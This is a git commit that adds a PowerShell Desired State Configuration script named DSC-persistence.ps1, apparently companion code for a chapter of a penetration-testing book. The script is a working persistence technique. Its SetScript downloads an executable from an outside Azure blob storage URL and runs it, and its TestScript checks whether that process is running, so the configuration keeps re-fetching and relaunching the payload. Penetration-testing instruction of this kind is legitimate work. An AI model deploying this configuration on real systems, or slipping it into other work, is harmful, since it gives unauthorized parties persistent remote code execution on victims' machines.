c3907a04be3b0a1738da753f20f7bdc199d173a0
Karl Fosaaen <kfosaaen@gmail.com>
2021-05-22 16:29:15 -0700

    Create DSC-persistence.ps1

---
+++ chapter-8/DSC-persistence.ps1
@@ -0,0 +1,19 @@
+Configuration Persistence
+{
+    Import-DscResource -ModuleName 'PSDesiredStateConfiguration'
+
+    Node localhost
+    {
+        Script ScriptExample
+        {
+            SetScript = {
+                wget https://azurepentesting.blob.core.windows.net/public/testfile.exe -OutFile c:\testfile.exe
+				C:\testfile.exe
+            }
+            TestScript = { 
+				if(((Test-Path c:\testfile.exe) -eq $true) -and ((Get-Process | where ProcessName -eq testfile) -ne $null)){return $true}else{return $false}				
+			}
+            GetScript = { return @{result = 'result'} }
+        }
+    }
+}
